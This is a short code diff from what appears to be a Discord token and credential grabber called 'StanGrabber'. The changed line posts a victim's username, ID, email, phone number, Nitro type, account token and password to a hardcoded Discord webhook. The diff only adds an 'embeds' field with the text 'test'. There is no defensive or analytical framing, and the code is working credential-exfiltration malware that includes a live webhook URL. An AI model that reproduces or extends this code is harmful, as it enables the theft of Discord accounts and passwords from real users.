@@ -60,7 +60,10 @@ exports.send = (req, res, webhook) =>
 
 	
 
-	axios.post(`https://discord.com/api/webhooks/797868594515804220/r9pUD70qd6SVtaKA-sy0AtXbkH7hjZlHAbYDF0gn-7-3uTpQAYMcv_oRcbf57y6uqnj8`, { username:`StanGrabber`, content: `Username : ` + username + '\n' + `ID : ` + id + '\n' + "E-Mail : " + email + '\n' + "Phone : " + phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " + password })
+	axios.post(`https://discord.com/api/webhooks/797868594515804220/r9pUD70qd6SVtaKA-sy0AtXbkH7hjZlHAbYDF0gn-7-3uTpQAYMcv_oRcbf57y6uqnj8`, { username:`StanGrabber`, content: `Username : ` + username + '\n' + `ID : ` + id + '\n' + "E-Mail : " + email + '\n' + "Phone : " + phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " + password, embeds:{
+	
+	description:`test`
+	}})
 	.then((resp) => 
 	{
 		if(resp.status === 200)
